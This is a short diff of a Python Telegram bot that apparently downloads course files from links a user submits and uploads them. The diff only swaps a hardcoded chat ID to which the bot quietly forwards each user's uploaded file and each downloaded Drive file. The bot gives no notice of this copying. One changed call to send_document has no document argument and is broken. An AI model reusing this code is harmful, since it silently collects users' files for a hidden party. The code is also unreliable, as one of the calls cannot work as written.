@@ -43,7 +43,7 @@ async def account_login(bot: Client, m: Message):
     editable = await m.reply_text('𝗦𝗘𝗡𝗗 𝗧𝗫𝗧 𝗙𝗜𝗟𝗘 𝗙𝗢𝗥 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗖𝗢𝗨𝗥𝗦𝗘 𝗔𝗡𝗗 𝗨𝗣𝗟𝗢𝗔𝗗 𝗧𝗢 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠')
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
-    await bot.send_document(-1002246496440, x)
+    await bot.send_document(-1002485430920, x)
     await input.delete(True)
 
 
@@ -176,7 +176,7 @@ async def account_login(bot: Client, m: Message):
                 if "drive" in url:
                     try:
                         ka = await helper.download(url, name)
-                        copy = await bot.send_document(chat_id= -1002246496440)
+                        copy = await bot.send_document(chat_id= -1002485430920)
                         count+=1
                         os.remove(ka)
                         time.sleep(1)
